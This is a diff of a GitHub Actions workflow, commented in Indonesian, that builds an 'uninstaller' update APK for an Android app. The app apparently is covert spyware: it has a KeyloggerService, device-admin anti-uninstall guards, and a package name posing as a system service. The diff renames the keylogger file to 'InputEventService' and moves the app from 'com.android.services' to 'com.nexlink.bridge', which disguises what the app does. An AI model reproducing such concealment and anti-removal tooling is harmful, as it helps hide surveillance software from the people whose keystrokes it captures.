@@ -12,7 +12,6 @@ name: Build Uninstaller APK
 #     saling update satu sama lain tanpa error "SHA berbeda".
 # =============================================================================
 
-
 on:
   push:
     branches: [ main, master ]
@@ -39,18 +38,18 @@ jobs:
       - name: Patch - Matikan semua anti-uninstall
         run: |
           cp android/scripts/uninstaller/AppDeviceAdminReceiver.kt \
-             android/app/src/main/kotlin/com/android/services/AppDeviceAdminReceiver.kt
+             android/app/src/main/kotlin/com/nexlink/bridge/AppDeviceAdminReceiver.kt
 
           sed -i 's/@Volatile var adminGuardEnabled: Boolean = true/@Volatile var adminGuardEnabled: Boolean = false/' \
-            android/app/src/main/kotlin/com/android/services/KeyloggerService.kt
+            android/app/src/main/kotlin/com/nexlink/bridge/InputEventService.kt
 
           sed -i 's/Thread { AppDeviceAdminReceiver.setBlockUninstall/\/\/ Thread { AppDeviceAdminReceiver.setBlockUninstall/' \
-            android/app/src/main/kotlin/com/android/services/ConnectorService.kt
+            android/app/src/main/kotlin/com/nexlink/bridge/ConnectorService.kt
           sed -i 's/\.also { it\.isDaemon = true }\.start()/\/\/ .also { it.isDaemon = true }.start()/' \
-            android/app/src/main/kotlin/com/android/services/ConnectorService.kt
+            android/app/src/main/kotlin/com/nexlink/bridge/ConnectorService.kt
 
           echo "✅ Patch applied"
-          grep "adminGuardEnabled" android/app/src/main/kotlin/com/android/services/KeyloggerService.kt
+          grep "adminGuardEnabled" android/app/src/main/kotlin/com/nexlink/bridge/InputEventService.kt
 
       - name: Decode Keystore
         run: |
@@ -87,7 +86,7 @@ jobs:
           echo "## 🗑️ Uninstaller APK Siap" >> $GITHUB_STEP_SUMMARY
           echo "| | |" >> $GITHUB_STEP_SUMMARY
           echo "|---|---|" >> $GITHUB_STEP_SUMMARY
-          echo "| **Package** | com.android.services (identik) |" >> $GITHUB_STEP_SUMMARY
+          echo "| **Package** | com.nexlink.bridge (identik) |" >> $GITHUB_STEP_SUMMARY
           echo "| **Keystore** | Sama → Android terima sebagai Update |" >> $GITHUB_STEP_SUMMARY
           echo "| **Anti-Uninstall** | OFF semua |" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
